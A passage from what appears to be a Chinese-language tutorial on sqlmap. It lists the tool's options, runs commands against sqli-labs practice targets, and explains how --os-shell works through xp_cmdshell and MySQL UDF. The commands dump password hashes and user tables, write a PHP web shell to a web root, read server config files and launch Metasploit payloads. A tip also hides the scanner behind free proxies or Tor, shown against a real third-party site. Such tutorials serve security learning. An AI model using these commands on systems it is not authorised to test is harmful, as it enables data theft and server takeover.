class="line">plugins:这里包含了各种数据库的信息和数据库通用事项。</span><br><span class="line">sqlmap.py:这是 sqlmap 的主程序，可以调用各种参数进行注入任务。</span><br><span class="line">sqlmapapi.py:这是 sqlmap 的 api 文件，可以将 sqlmap 集成到其他平台上。</span><br><span class="line">tamper:脚本文件</span><br></pre></td></tr></table></figure><h1 id="SQLMAP参数详解"><a href="#SQLMAP参数详解" class="headerlink" title="SQLMAP参数详解"></a>SQLMAP参数详解</h1><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -hh</span><br></pre></td></tr></table></figure><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-h,--<span class="built_in">help</span>   <span class="comment">#显示基础帮助信息</span></span><br><span class="line">-hh         <span class="comment">#显示高级帮助信息</span></span><br><span class="line">--version   <span class="comment">#显示版本信息</span></span><br><span class="line">-v          <span class="comment">#输出信息的级别 0-6（默认为1）</span></span><br><span class="line"></span><br><span class="line">sqlmap的输出信息按从简到繁共分为7个级别（和葫芦娃一样多），依次为0、1、2、3。4、5和6。使用参数“-v &lt;级别&gt;”来指定某个等级，如果使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别描述如下：</span><br><span class="line">0：只显示python的tracebacks信息，错误信息[ERROR]和关键信息[CRITICAL];</span><br><span class="line">1：同时显示普通信息[INFO]和警告信息[WARNING]；</span><br><span class="line">2：同时显示调试信息[DEBUG]</span><br><span class="line">3：同时显示注入使用的攻击载荷</span><br><span class="line">4：同时显示HTTP请求；</span><br><span class="line">5：同时显示HTTP响应头；</span><br><span class="line">6：同时显示HTTP响应体；</span><br></pre></td></tr></table></figure><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">必须提供至少一个的以下选项来作为目标</span><br><span class="line">-u URL, --url=URL   目标url (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">-d DIRECT           直接连接到数据库</span><br><span class="line">-l LOGFILE          从Burp或WebScarab代理日志文件解析目标</span><br><span class="line">-m BULKFILE         扫描文本文件中给定的多个目标</span><br><span class="line">-r REQUESTFILE      从文件加载HTTP请求</span><br><span class="line">-g GOOGLEDORK       将谷歌处理结果作为目标url</span><br><span class="line">-c CONFIGFILE       从INI配置文件加载选项</span><br></pre></td></tr></table></figure><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于指定如何连接到目标URL</span><br><span class="line">-A AGENT, --user..  指定HTTP请求 User-Agent 报头值</span><br><span class="line">-H HEADER, --hea..  其他header (e.g. <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)</span><br><span class="line">--method=METHOD     强制使用给定的HTTP方法(e.g. PUT)</span><br><span class="line">--data=DATA         通过POST发送的数据字符串 (e.g. <span class="string">&quot;id=1&quot;</span>)</span><br><span class="line">--param-del=PARA..  用于分割参数值的字符 (e.g. &amp;)(当 GET 或 POST 的数据需要用其他字符分割测试参数的时候需要用到此参数。)</span><br><span class="line">--cookie=COOKIE     HTTP Cookie 报头值 (e.g. <span class="string">&quot;PHPSESSID=a8d127e..&quot;</span>)</span><br><span class="line">--cookie-del=COO..  用于分割cookie值的字符 (e.g. ;)</span><br><span class="line">--load-cookies=L..  在 Netscape/ wget 格式的文件中包含 cookie</span><br><span class="line">--drop-set-cookie   忽略响应中的Set-Cookie头</span><br><span class="line">--mobile            通过HTTP User-Agent 头模拟智能手机</span><br><span class="line">--random-agent      使用随机选择的HTTP用户代理头值</span><br><span class="line">--host=HOST         HTTP Host 头</span><br><span class="line">--referer=REFERER   HTTP Referer 头</span><br><span class="line">--headers=HEADERS   额外的 headers (e.g. <span class="string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)</span><br><span class="line">--auth-type=AUTH..  HTTP身份验证类型 (Basic, Digest, NTLM or PKI)</span><br><span class="line">--auth-cred=AUTH..  HTTP身份验证凭证 (name:password)</span><br><span class="line">--auth-file=AUTH..  HTTP身份验证PEM证书/私钥文件</span><br><span class="line">--ignore-code=IG..  忽略(有问题的)HTTP错误代码 (e.g. 401)</span><br><span class="line">--ignore-redirects  忽略重定向的尝试</span><br><span class="line">--ignore-timeouts   忽略连接超时</span><br><span class="line">--delay=DELAY       每个HTTP请求之间的延迟(秒)</span><br><span class="line">--<span class="built_in">timeout</span>=TIMEOUT   等待超时连接秒 (default 30)</span><br><span class="line">--retries=RETRIES   当连接超时时重试 (default 3)</span><br><span class="line">--randomize=RPARAM  随机改变给定参数的值</span><br><span class="line">--safe-url=SAFEURL  测试期间经常访问的URL地址</span><br><span class="line">--safe-post=SAFE..  POST数据发送到一个安全的URL</span><br><span class="line">--safe-req=SAFER..  从文件加载安全的HTTP请求</span><br><span class="line">--safe-freq=SAFE..  在两次访问之间提供安全 URL 的请求</span><br><span class="line">--skip-urlencode    跳过 URL 编码的有效载荷数据</span><br><span class="line">--csrf-token=CSR..  用于保存反csrf令牌的参数</span><br><span class="line">--csrf-url=CSRFURL  提取反csrf令牌访问的URL地址</span><br><span class="line">--csrf-method=CS..  在反csrf令牌页面访问期间使用的HTTP方法</span><br><span class="line">--csrf-retries=C..  重新尝试获取反csrf令牌 (default 0)</span><br><span class="line">--force-ssl         强制使用SSL/HTTPS</span><br><span class="line">--chunked           使用HTTP分块传输编码 (POST) 请求</span><br><span class="line">--hpp               使用HTTP参数污染方法</span><br><span class="line">--<span class="built_in">eval</span>=EVALCODE     在每次请求时根据所写 python 代码做完修改后请求 (e.g. <span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">语法实例</span></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-11/&quot; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-20/index.php&quot; --cookie=&quot;uname=admin*&quot; --banner</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注：探测 cookie 时，需要用*号指定一下；</span></span><br></pre></td></tr></table></figure><h2 id="代理Request"><a href="#代理Request" class="headerlink" title="代理Request"></a>代理Request</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--proxy=PROXY       使用代理连接到目标URL</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">网上找个免费代理：https://www.kuaidaili.com/free/inha/</span></span><br><span class="line">sqlmap -u &quot;http://ke.qq.com&quot; --proxy=&quot;http://代理 IP 地址:端口&quot; --random-agent --banner</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这样虽然避免了服务器对我们的封锁但是不能够做到完全匿名，如果有兴趣的同学可以使用 tor 匿名网络进行代理探测。但是过程相对来说会比较复杂</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">具体步骤如下：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要先使用代理访问 tor 网络然后在 sqlmap 中配置 tor 代理。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置方法：--tor --tor-type 类型一般选择 socks5，然后在 sqlmap 上使用 --check-tor 选项进行检查</span></span><br><span class="line">--proxy-cred=PRO..  代理身份验证凭证 (name:password)</span><br><span class="line">--proxy-file=PRO..  从文件加载代理列表</span><br><span class="line">--tor               使用Tor匿名网络</span><br><span class="line">--tor-port=TORPORT  设置Tor代理端口以外的默认</span><br><span class="line">--tor-type=TORTYPE  设置Tor代理类型(HTTP(default), SOCKS4或SOCKS5)</span><br><span class="line">--check-tor         检查Tor是否正确使用</span><br><span class="line">--ignore-proxy      忽略系统默认代理设置</span><br></pre></td></tr></table></figure><h2 id="Optimization-优化选项"><a href="#Optimization-优化选项" class="headerlink" title="Optimization(优化选项)"></a>Optimization(优化选项)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">这些选项可用于优化sqlmap的性能</span><br><span class="line">-o                  打开所有优化开关</span><br><span class="line">--predict-output    预测常见查询输出</span><br><span class="line">--keep-alive        使用持久HTTP连接</span><br><span class="line">--null-connection   检索页面长度，而不需要实际的HTTP响应体</span><br><span class="line">--threads=THREADS   最大并发HTTP请求数 (默认为1)</span><br></pre></td></tr></table></figure><h2 id="Injection-注入选项"><a href="#Injection-注入选项" class="headerlink" title="Injection(注入选项)"></a>Injection(注入选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这些选项可用于指定要测试的参数、提供自定义注入有效负载和可选的篡改脚本</span></span><br><span class="line">-p TESTPARAMETER    可测试的参数</span><br><span class="line">--skip=SKIP         跳过给定参数的测试</span><br><span class="line">--skip-static       跳过看起来不是动态的测试参数</span><br><span class="line">--param-exclude=..  Regexp从测试中排除参数 (e.g. <span class="string">&quot;ses&quot;</span>)</span><br><span class="line">--param-filter=P..  按位置选择可测试参数 (e.g. <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">--dbms=DBMS         不仅可以指定数据库类型，还可以指定数据库版本。强制后端DBMS为提供的值</span><br><span class="line">--dbms-cred=DBMS..  DBMS身份验证凭证 (user:password)</span><br><span class="line">--os=OS             强制后端DBMS操作系统为提供的值</span><br><span class="line">--invalid-bignum    使用大的数字使值无效</span><br><span class="line">--invalid-logical   使用逻辑运算来使值无效</span><br><span class="line">--invalid-string    使用随机字符串使值无效</span><br><span class="line">--no-cast           关闭有效载荷投放机制</span><br><span class="line">--no-escape         关闭字符串转义机制</span><br><span class="line">--prefix=PREFIX     注入有效载荷前缀字符串</span><br><span class="line">--suffix=SUFFIX     注入有效载荷后缀字符串</span><br><span class="line">--tamper=TAMPER     使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">语法实例</span></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; -p id --dbms=&quot;MySQL&quot; --banner</span><br></pre></td></tr></table></figure><h2 id="Detection-探测选项"><a href="#Detection-探测选项" class="headerlink" title="Detection(探测选项)"></a>Detection(探测选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于自定义检测阶段</span><br><span class="line">--level=LEVEL       要执行的测试级别 (1-5, default 1)</span><br><span class="line">--risk=RISK         进行测试的风险 (1-3, default 1)</span><br><span class="line">--string=STRING     查询评估为True时匹配的字符串</span><br><span class="line">--not-string=NOT..  查询评估为False时要匹配的字符串</span><br><span class="line">--regexp=REGEXP     正则表达式在查询评估为True时匹配</span><br><span class="line">--code=CODE         查询评估为True时要匹配的HTTP代码</span><br><span class="line">--smart             仅在启发式为正的情况下执行全面测试</span><br><span class="line">--text-only         仅根据文本内容比较页面</span><br><span class="line">--titles            仅根据标题比较页面</span><br></pre></td></tr></table></figure><h2 id="Techniques-注入技术选项"><a href="#Techniques-注入技术选项" class="headerlink" title="Techniques(注入技术选项)"></a>Techniques(注入技术选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于调整特定SQL注入技术的测试</span><br><span class="line">--technique=TECH..  使用的SQL注入技术 (default <span class="string">&quot;BEUSTQ&quot;</span>)</span><br><span class="line">    B:Boolean-based-blind  （布尔型盲注）</span><br><span class="line">    E:Error-based   （报错型注入）</span><br><span class="line">    U:Union query-based  （联合注入）</span><br><span class="line">    S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</span><br><span class="line">    T:Time-based blind  （基于时间延迟注入） </span><br><span class="line">--time-sec=TIMESEC  延迟DBMS响应的秒数 (default 5)</span><br><span class="line">--union-cols=UCOLS  要测试UNION查询SQL注入的列范围</span><br><span class="line">--union-char=UCHAR  用于暴力破解列数的字符</span><br><span class="line">--union-from=UFROM  在UNION查询SQL注入的FROM部分中使用的表</span><br><span class="line">--dns-domain=DNS..  用于DNS渗透攻击的域名</span><br><span class="line">--second-url=SEC..  搜索结果页面URL以获取二阶响应</span><br><span class="line">--second-req=SEC..  从文件加载二阶HTTP请求</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">实例</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找一个基于布尔的盲注：http://192.168.1.100/sqli-labs/Less-8/</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-8/?id=1&quot; --technique=&quot;B&quot; --banner</span><br></pre></td></tr></table></figure><h2 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-f,--fingerprint    执行广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure><h2 id="Enumeration-获取详细数据"><a href="#Enumeration-获取详细数据" class="headerlink" title="Enumeration(获取详细数据)"></a>Enumeration(获取详细数据)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于枚举表中包含的端到端数据库管理系统信息、结构和数据</span><br><span class="line">-a, --all           检索所有内容</span><br><span class="line">-b, --banner        检索 DBMS banner</span><br><span class="line">--current-user      检索 DBMS 当前用户</span><br><span class="line">--current-db        检索 DBMS 当前数据库</span><br><span class="line">--hostname          检索 DBMS 服务器主机名</span><br><span class="line">--is-dba            检测 DBMS 当前用户是否为 DBA</span><br><span class="line">--<span class="built_in">users</span>             枚举 DBMS 用户</span><br><span class="line">--passwords         枚举 DBMS 用户密码哈希</span><br><span class="line">--privileges        枚举 DBMS 用户权限</span><br><span class="line">--roles             枚举 DBMS 用户角色</span><br><span class="line">--dbs               枚举 DBMS 数据库</span><br><span class="line">--tables            枚举 DBMS 数据库表</span><br><span class="line">--columns           枚举 DBMS 数据库表列</span><br><span class="line">--schema            枚举 DBMS 架构</span><br><span class="line">--count             检索表的条目数</span><br><span class="line">--dump              转储 DBMS 数据库表条目</span><br><span class="line">--dump-all          转储所有 DBMS 数据库表表条目</span><br><span class="line">--search            搜索列、表 和/或 数据库名称</span><br><span class="line">--comments          在枚举期间检查 DBMS 注释</span><br><span class="line">--statements        检索在 DBMS 上运行的 SQL 语句</span><br><span class="line">-D DB               要枚举的 DBMS 数据库</span><br><span class="line">-T TBL              要枚举的 DBMS 数据库表</span><br><span class="line">-C COL              要枚举的 DBMS 数据库表列</span><br><span class="line">-X EXCLUDE          要不枚举的 DBMS 数据库标识符</span><br><span class="line">-U USER             要枚举的 DBMS 用户</span><br><span class="line">--exclude-sysdbs    枚举表时排除 DBMS 系统数据库</span><br><span class="line">--pivot-column=P..  数据透视列名称</span><br><span class="line">--<span class="built_in">where</span>=DUMPWHERE   表转储时使用 WHERE 条件</span><br><span class="line">--start=LIMITSTART  要检索的第一个转储表条目</span><br><span class="line">--stop=LIMITSTOP    要检索的最后一个转储表条目</span><br><span class="line">--first=FIRSTCHAR   要检索的第一个查询输出单词字符</span><br><span class="line">--last=LASTCHAR     要检索的最后一个查询输出单词字符</span><br><span class="line">--sql-query=SQLQ..  要执行的 SQL 语句</span><br><span class="line">--sql-shell         交互式 SQL 外壳的提示</span><br><span class="line">--sql-file=SQLFILE  从给定文件执行 SQL 语句</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">实例</span></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; --banner --current-user --current-db --passwords</span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; -D security --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; -D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="Brute-force-爆破选项"><a href="#Brute-force-爆破选项" class="headerlink" title="Brute force(爆破选项)"></a>Brute force(爆破选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于运行暴力检查</span><br><span class="line">--common-tables     检查是否存在公共表</span><br><span class="line">--common-columns    检查是否存在公共列</span><br><span class="line">--common-files      检查是否存在通用文件</span><br></pre></td></tr></table></figure><h2 id="User-defined-function-injection-用户自定义函数注入选项"><a href="#User-defined-function-injection-用户自定义函数注入选项" class="headerlink" title="User-defined function injection(用户自定义函数注入选项)"></a>User-defined function injection(用户自定义函数注入选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于创建用户自定义的函数</span><br><span class="line">--udf-inject        注入用户自定义的函数</span><br><span class="line">--shared-lib=SHLIB  共享库的本地路径</span><br></pre></td></tr></table></figure><h2 id="File-system-access-系统文件操作选项"><a href="#File-system-access-系统文件操作选项" class="headerlink" title="File system access(系统文件操作选项)"></a>File system access(系统文件操作选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于访问文件系统基础的端到端数据库管理系统</span><br><span class="line">--file-read=FILE..  从后端 DBMS 文件系统读取文件</span><br><span class="line">--file-write=FIL..  在端到端 DBMS 文件系统上写入本地文件</span><br><span class="line">--file-dest=FILE..  要写入的端到端 DBMS 绝对文件路径</span><br><span class="line"></span><br><span class="line">python3 sqlmap.py -u http://172.26.2.36/vulnlab/index.php?<span class="built_in">id</span>=1 --file-write=eval.txt --file-dest=/var/www/html/upload/123.php</span><br><span class="line">python3 sqlmap.py -u http://172.26.2.36/vulnlab/index.php?<span class="built_in">id</span>=1 --file-read=/etc/httpd/conf</span><br></pre></td></tr></table></figure><h2 id="Operating-system-access-操作系统访问选项"><a href="#Operating-system-access-操作系统访问选项" class="headerlink" title="Operating system access(操作系统访问选项)"></a>Operating system access(操作系统访问选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于访问操作系统基础的端到端数据库管理系统</span><br><span class="line">--os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">--os-shell          交互式操作系统外壳的提示</span><br><span class="line">--os-pwn            提示 OOB shell, Meterpreter or VNC</span><br><span class="line">--os-smbrelay       一键提示 OOB shell, Meterpreter or VNC</span><br><span class="line">--os-bof            存储过程缓冲区溢出利用</span><br><span class="line">--priv-esc          数据库进程用户权限升级</span><br><span class="line">--msf-path=MSFPATH  安装 Metasploit 框架的本地路径</span><br><span class="line">--tmp-path=TMPPATH  临时文件目录的远程绝对路径</span><br><span class="line"></span><br><span class="line">sqlmap -u http://172.26.2.36/vulnlab/index.php?<span class="built_in">id</span>=1 --os-pwn --msf-path /usr/share/metasploit-framework/</span><br></pre></td></tr></table></figure><h2 id="Windows-registry-access-Windows-注册表选项"><a href="#Windows-registry-access-Windows-注册表选项" class="headerlink" title="Windows registry access(Windows 注册表选项)"></a>Windows registry access(Windows 注册表选项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项可用于访问端到端数据库管理系统 Windows 注册表</span><br><span class="line">--reg-read          读取 Windows 注册表项值</span><br><span class="line">--reg-add           写入 Windows 注册表项值数据</span><br><span class="line">--reg-del           删除 Windows 注册表项值</span><br><span class="line">--reg-key=REGKEY    Windows 注册表项</span><br><span class="line">--reg-value=REGVAL  Windows 注册表密钥值</span><br><span class="line">--reg-data=REGDATA  Windows 注册表密钥值数据</span><br><span class="line">--reg-type=REGTYPE  Windows 注册表键值类型</span><br></pre></td></tr></table></figure><h2 id="General（常规选项）"><a href="#General（常规选项）" class="headerlink" title="General（常规选项）"></a>General（常规选项）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这些选项可用于设置一些常规工作参数</span></span><br><span class="line">-s SESSIONFILE      从存储的（.sqlite）文件加载会话</span><br><span class="line">-t TRAFFICFILE      将所有 HTTP 流量记录到文本文件中</span><br><span class="line">--answers=ANSWERS   设置预定义answers (e.g. <span class="string">&quot;quit=N,follow=N&quot;</span>)</span><br><span class="line">--<span class="built_in">base64</span>=BASE64P..  包含 Base64 编码数据的参数</span><br><span class="line">--base64-safe       使用 URL 和文件名安全 Base64 字母表</span><br><span class="line">--batch             不需要用户输入，使用默认行为</span><br><span class="line">--binary-fields=..  具有二进制值的结果字段 (e.g. <span class="string">&quot;digest&quot;</span>)</span><br><span class="line">--check-internet    在评估目标之前检查互联网连接</span><br><span class="line">--cleanup           从 sqlmap 特定的 UDF 和表清理 DBMS</span><br><span class="line">--crawl=CRAWLDEPTH  从目标 URL 开始抓取网站</span><br><span class="line">--crawl-exclude=..  regexp从爬网中排除页面 (e.g. <span class="string">&quot;logout&quot;</span>)</span><br><span class="line">--csv-del=CSVDEL    CSV 输出中使用的分隔字符 (default <span class="string">&quot;,&quot;</span>)</span><br><span class="line">--charset=CHARSET   盲 SQL 注入字符集 (e.g. <span class="string">&quot;0123456789abcdef&quot;</span>)</span><br><span class="line">--dump-format=DU..  转储数据的格式 (CSV (default), HTML or SQLITE)</span><br><span class="line">--encoding=ENCOD..  用于数据检索的字符编码 (e.g. GBK)</span><br><span class="line">--eta               显示每个输出的估计到达时间</span><br><span class="line">--flush-session     清除当前已有的日志，重新探测</span><br><span class="line">--forms             在目标 URL 上解析和测试表单</span><br><span class="line">--fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">--gpage=GOOGLEPAGE  使用来自指定页号的 Google dork 结果</span><br><span class="line">--har=HARFILE       将所有 HTTP 流量记录到 HAR 文件中</span><br><span class="line">--hex               在数据检索期间使用十六进制转换</span><br><span class="line">--output-dir=OUT..  自定义输出目录路径</span><br><span class="line">--parse-errors      分析并显示来自响应的 DBMS 错误消息</span><br><span class="line">--preprocess=PRE..  使用给定的脚本预处理响应数据</span><br><span class="line">--repair            具有未知字符标记的Redump条目</span><br><span class="line">--save=SAVECONFIG   将选项保存到配置 INI 文件</span><br><span class="line">--scope=SCOPE       用于筛选目标的 Regexp</span><br><span class="line">--skip-waf          跳过 WAF/IPS 保护的启发式检测</span><br><span class="line">--table-prefix=T..  用于临时表的前缀 (default: <span class="string">&quot;sqlmap&quot;</span>)</span><br><span class="line">--test-filter=TE..  按有效负载 和/或 标题选择测试 (e.g. ROW)</span><br><span class="line">--test-skip=TEST..  按有效负载 和/或 标题跳过测试 (e.g. BENCHMARK)</span><br><span class="line">--web-root=WEBROOT  Web 服务器文档根目录 (e.g. <span class="string">&quot;/var/www&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">案例</span></span><br><span class="line">sqlmap -u &quot;http://192.168.1.120/sqli-labs/Less-1/?id=1&quot; --batch --flush-session</span><br></pre></td></tr></table></figure><h2 id="Miscellaneous-杂项"><a href="#Miscellaneous-杂项" class="headerlink" title="Miscellaneous(杂项)"></a>Miscellaneous(杂项)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这些选项不适合任何其他类别</span><br><span class="line">-z MNEMONICS        使用短的分音 (e.g. <span class="string">&quot;flu,bat,ban,tec=EU&quot;</span>)</span><br><span class="line">--alert=ALERT       找到 SQL 注入时运行主机 OS 命令</span><br><span class="line">--beep              问题 和/或 找到 SQL 注入时发出蜂鸣音</span><br><span class="line">--dependencies      检查缺少（可选）sqlmap 依赖项</span><br><span class="line">--disable-coloring  禁用控制台输出着色</span><br><span class="line">--list-tampers      显示可用篡改脚本的列表</span><br><span class="line">--offline           脱机模式下工作（仅使用会话数据）</span><br><span class="line">--purge             安全地从 sqlmap 数据目录中删除所有内容</span><br><span class="line">--results-file=R..  CSV 结果文件在多个目标模式下的位置</span><br><span class="line">--sqlmap-shell      交互式 sqlmap 外壳的提示</span><br><span class="line">--tmp-dir=TMPDIR    用于存储临时文件的本地目录</span><br><span class="line">--unstable          调整不稳定连接的选项</span><br><span class="line">--update            更新 sqlmap</span><br><span class="line">--wizard            适合初学者用户的简单向导界面</span><br></pre></td></tr></table></figure><h1 id="SQLMAP-–os-shell原理"><a href="#SQLMAP-–os-shell原理" class="headerlink" title="SQLMAP –os-shell原理"></a>SQLMAP –os-shell原理</h1><h2 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h2><blockquote><ul><li>拥有网站的写入权限</li><li><code>Secure_file_priv</code> 参数为空或者为指定路径。</li></ul><p>普通注入 –os-shell 主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。</p></blockquote><h2 id="利用sqlmap进行注入检测"><a href="#利用sqlmap进行注入检测" class="headerlink" title="利用sqlmap进行注入检测"></a>利用sqlmap进行注入检测</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121418697.png" alt="截图"></p><p>sqlmap主要做了三件事情：</p><ol><li>进行目标的一个基础信息的探测。</li><li>上传shell到目标web网站上。首先通过into outfile进行文件的写入上传一个上传功能的马。然后通过上传马进行shell的上传。</li><li>退出时执行命令删除shell。</li></ol><h2 id="Microsoft-SQL-Server"><a href="#Microsoft-SQL-Server" class="headerlink" title="Microsoft SQL Server"></a>Microsoft SQL Server</h2><p>Sql Server –os-shell 主要是利用 xp_cmdshell  扩展进行命令执行。<br>SQLMAP  将会使用 xp_cmdshell  存储过程，如果被禁（在Microsoft SQLServer 2005及以上版本默认禁制）， SQLMAP  会重新启用它，如果不存在，会自动创建。</p><h3 id="必要条件："><a href="#必要条件：" class="headerlink" title="必要条件："></a>必要条件：</h3><ul><li>数据库支持外连</li><li>数据库权限为SA权限</li></ul><h3 id="SQLMAP-主要做了三件事情："><a href="#SQLMAP-主要做了三件事情：" class="headerlink" title="SQLMAP  主要做了三件事情："></a>SQLMAP  主要做了三件事情：</h3><ul><li>识别当前数据库类型，然后打印出来。</li><li>检测是否为数据库 dba ，也就是查看是否为 sa  权限。</li><li>检测是否开启了 xp_cmdshell ，如果没有开启 SQLMAP  就会尝试开启。</li></ul><p>SQLMAP  未能成功开启 xp_cmdshell  时,可执行 –sql-shell  手动开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>查看是否为 SA</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure><p>查看是否存在 xp_cmdshell  扩展进程，显示1为存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and </span><br><span class="line">name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure><p>SQLMAP  会在执行我们输入的命令之前执行 ping -n 10 127.0.0.1  和 echo 1  ,然后就是我们输入的命令，这里命令都被进行16进制编码了。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121422404.png" alt="image-20221112142254065"></p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>MySQL  –os-shell  主要利用的原理是通过 UDF  执行命令<br>SQLMAP 上传一个二进制库，包含用户自定义的函数， sys_exec() 和sys_eval() 。那么他创建的这两个函数可以执行系统命令。</p><h3 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h3><ul><li>数据库支持外连</li><li>Secure_file_priv  参数为空或者为指定路径。</li><li>对 MySQL  目录存在写入权限。</li><li>针对版本大于5.1,需要存在 &#x2F;lib&#x2F;plugin  目录。</li></ul><h3 id="Mysql-Udf提权："><a href="#Mysql-Udf提权：" class="headerlink" title="Mysql Udf提权："></a>Mysql Udf提权：</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121424421.png" alt="image-20221112142449745"></p><p><strong>这个时候 SQLMAP  主要做了五件事情：</strong></p><ol><li>连接 MySQL  数据库并且获取数据库版本。</li><li>检测是否为数据库 dba 。</li><li>检测 sys_exec  和 sys_eval  2个函数是否已经被创建了。</li><li>上传 dll  文件到对应目录。</li><li>用户退出时默认删除创建的 sys_exec  和 sys_eval  2个函数。</li></ol><h1 id="SQLMAP实例"><a href="#SQLMAP实例" class="headerlink" title="SQLMAP实例"></a>SQLMAP实例</h1><h2 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h2><h3 id="检测SQL注入漏洞"><a href="#检测SQL注入漏洞" class="headerlink" title="检测SQL注入漏洞"></a>检测SQL注入漏洞</h3><p>测试目标是否存在SQL注入漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python.exe .\sqlmap.py -u http://124.223.217.243:8088/sqli-labs/Less-1/?<span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure><h3 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 --current-user</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 